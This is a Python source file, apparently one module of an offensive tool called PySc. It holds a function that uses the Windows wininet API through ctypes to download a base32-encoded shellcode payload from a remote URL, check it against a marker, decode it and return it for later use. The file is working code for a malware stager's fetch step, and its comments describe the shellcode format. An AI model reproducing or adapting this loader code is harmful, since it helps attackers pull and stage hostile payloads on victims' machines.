# !/usr/bin/python
# -*- coding: utf-8 -*-

#

"""
	PySc URL Request
	This module contains the logic for the following checks .:

	- urlrequest --> Retrieves shellcode from target URL
"""

from urlparse import urlparse
from base64 import b32decode
from ctypes.wintypes import DWORD
from ctypes import *

kernel32 = windll.kernel32
wininet = windll.wininet

def urlrequest(url_target, url_sc_marker, debug):

    # attempt to use Internet Explorer (urlmon) to retrieve
    # shellcode from a remote URL

    INTERNET_OPEN_TYPE_PRECONFIG = 0
    INTERNET_SERVICE_HTTP = 3
    INTERNET_FLAG_RELOAD = 0x80000000
    INTERNET_FLAG_CACHE_IF_NET_FAIL = 0x00010000
    INTERNET_FLAG_NO_CACHE_WRITE = 0x04000000
    INTERNET_FLAG_PRAGMA_NOCACHE = 0x00000100
    HTTP_QUERY_FLAG_NUMBER = 0x20000000
    HTTP_QUERY_STATUS_CODE = 19
    dwStatus = DWORD()
    dwBufLen = DWORD(4)
    buff = c_buffer(0x2000)
    bytesRead = DWORD()
    useragent = 'Mozilla/5.0 PySC'
    method = 'GET'
    data = ''

    # parse url into peices for later use

    p_url = urlparse(url_target)
    path = p_url.path
    netloc = p_url.netloc.split(':')
    conn_user = p_url.username
    conn_pass = p_url.password

    if p_url.port:
        conn_port = p_url.port
    elif p_url.scheme == 'http':
        conn_port = 80
    else:
        conn_port = 443

    if debug:
        print '\n [>] Checking URL'

    try:
        hInternet = wininet.InternetOpenA(
                    useragent,
                    INTERNET_OPEN_TYPE_PRECONFIG,
                    False,
                    False,
                    False,
                    )

        if not hInternet:
            if debug:
                print ' [!] Unable to build connection to %s' \
                    % p_url.geturl()
            raise Exception

        hConnect = wininet.InternetConnectA(
                    hInternet,
                    netloc[0],
                    conn_port,
                    conn_user,
                    conn_pass,
                    INTERNET_SERVICE_HTTP,
                    False,
                    False,
                    )

        if not hConnect:
            if debug:
                print ' [!] Unable to make connection to %s' \
                    % p_url.geturl()
            raise Exception

        hRequest = wininet.HttpOpenRequestA(
                    hConnect,
                    method,
                    path,
                    False,
                    False,
                    False,
                    INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | \
                        INTERNET_FLAG_CACHE_IF_NET_FAIL | \
                        INTERNET_FLAG_PRAGMA_NOCACHE,
                    False,
                    )

        if not hRequest:
            if debug:
                print ' [!] Unable to open request to %s' % p_url.geturl()
            raise Exception

        hSendRequest = wininet.HttpSendRequestA(
                        hRequest,
                        False,
                        False,
                        False,
                        False,
                        )

        if not hSendRequest:
            if debug:
                print ' [!] Unable to send request to %s' % p_url.geturl()
            raise Exception

        hQuery = wininet.HttpQueryInfoA(
                    hRequest,
                    HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
                    byref(dwStatus),
                    byref(dwBufLen),
                    False,
                    )

        if not hQuery:
            if debug:
                print ' [!] Unable to complete query to %s' \
                    % p_url.geturl()
            raise Exception

        if dwStatus.value != 200:
            if debug:
                print ' [!] Incorrect server response from %s' \
                    % p_url.geturl()
            raise Exception

        # conntection ok, read data (limited to buffer size)

        hRead = wininet.InternetReadFile(
                hRequest,
                buff,
                len(buff),
                byref(bytesRead),
                )

        if not hRead:
            if debug:
                print ' [!] Unable to read response from %s' \
                    % p_url.geturl()
        else:
            data = data + buff.raw[:bytesRead.value]
            if debug:
                print ' [>] Reading in response from %s' % p_url.geturl()

        # Extract Shellcode... example response from server provides
        # only base32 encoded string
        # example: text = "SC7TUISAAAABQITZJR2JSIWURQRNJAZC2SCSFX...."

        if data.startswith(url_sc_marker):
            datavalue = data
        if not datavalue:
            if debug:
                print ' [!] No shellcode received from %s' % p_url.geturl()
            return
        else:

            # check that shellcode i can be decoded
            # (base32, skipping intial SC marker)

            try:
                shellcode = \
                    b32decode(datavalue[len(url_sc_marker):])
                if debug:
                    print ' [>] Returning shellcode from %s' \
                        % p_url.geturl()
                return shellcode
            except:
                if debug:
                    print ' [!] Cannot decode shellcode from URL (%s)' \
                        % p_url.geturl()
                return
    except:
        if debug:
            print ' [!] Unable to retrieve shellcode from URL (%s)' \
                % p_url.geturl()
        return